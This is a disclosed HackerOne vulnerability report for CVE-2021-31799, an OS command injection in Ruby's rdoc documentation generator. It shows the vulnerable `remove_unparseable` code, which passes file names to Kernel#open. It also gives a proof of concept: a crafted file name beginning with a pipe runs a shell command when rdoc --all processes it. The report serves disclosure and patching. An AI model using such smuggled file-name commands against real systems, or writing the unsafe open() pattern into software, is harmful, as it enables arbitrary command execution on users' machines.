# [M] OS Command Injection in 'rdoc' documentation generator

## Summary
Severity: Medium (CVSS 6.4)
Program: Ruby
Weakness: OS Command Injection
Reporter: sighook
State: resolved
Disclosed: 2021-07-13T07:38:03.945Z
CVE: CVE-2021-31799
Source: https://hackerone.com/reports/1161691

## Details
Details:
If the `remove_unparseable` function  receives a list of files with a command in the name of one of them, it will be executed.
Just enough the name to match the pattern. The problem code:
```ruby
  def remove_unparseable files
    files.reject do |file, *|
      file =~ /\.(?:class|eps|erb|scpt\.txt|svg|ttf|yml)$/i or
        (file =~ /tags$/i and
         open(file, 'rb') { |io|
           io.read(100) =~ /\A(\f\n[^,]+,\d+$|!_TAG_)/
         })
    end
  end
```


# PoC

```bash
$ touch '| touch evil.txt && echo tags'
$ ls
'| touch evil.txt && echo tags'
$ rdoc --all
Parsing sources...
100% [ 1/ 1]  | touch evil.txt && echo tags

Generating Darkfish format into /home/tmp/doc...

  Files:      1

  Classes:    0 (0 undocumented)
  Modules:    0 (0 undocumented)
  Constants:  0 (0 undocumented)
  Attributes: 0 (0 undocumented)
  Methods:    0 (0 undocumented)

  Total:      0 (0 undocumented)
    0.00% documented
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/1161691_
